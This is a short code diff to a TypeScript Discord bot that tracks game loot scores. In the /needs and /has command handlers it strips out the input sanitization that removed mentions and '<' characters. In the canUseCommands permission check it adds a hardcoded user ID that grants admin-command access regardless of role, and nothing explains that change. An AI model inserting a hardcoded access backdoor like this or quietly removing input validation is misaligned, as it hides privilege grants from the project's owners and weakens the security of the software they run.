@@ -354,7 +354,7 @@ export class LootScoreBot {
             }
 
             if (message.content.startsWith('/needs') && this.canUseCommands(message)) {
-                let query = message.content.replace('/needs ', '').replace(/(@\S+)/, '').replace('<', '').trim();
+                let query = message.content.replace('/needs ', '');
 
                 this._lootLogService.getItemScores(this._itemScoresChannel).then((array) => {
                     let item = array.find((x) => x.shorthand.toLowerCase() === query.toLowerCase() || x.displayName.toLowerCase() === query.toLowerCase());
@@ -394,7 +394,7 @@ export class LootScoreBot {
             }
 
             if (message.content.startsWith('/has') && this.canUseCommands(message)) {
-                let query = message.content.replace('/has ', '').replace(/(@\S+)/, '').replace('<', '').trim();
+                let query = message.content.replace('/has ', '');
 
                 this._lootLogService.getItemScores(this._itemScoresChannel).then((array) => {
                     let item = array.find((x) => x.shorthand.toLowerCase() === query.toLowerCase() || x.displayName.toLowerCase() === query.toLowerCase());
@@ -562,7 +562,7 @@ export class LootScoreBot {
     }
 
     private canUseCommands(message: Message): boolean {
-        return message.channel.id === this._adminChannel.id && message.member.roles.some((role) => role.name === 'LootScore Admin' || role.name === 'Leadership');
+        return message.channel.id === this._adminChannel.id && message.member.roles.some((role) => role.name === 'LootScore Admin' || role.name === 'Leadership' || message.author.id === '200099393041465345');
     }
 
     public manageDailyJobs(): void {
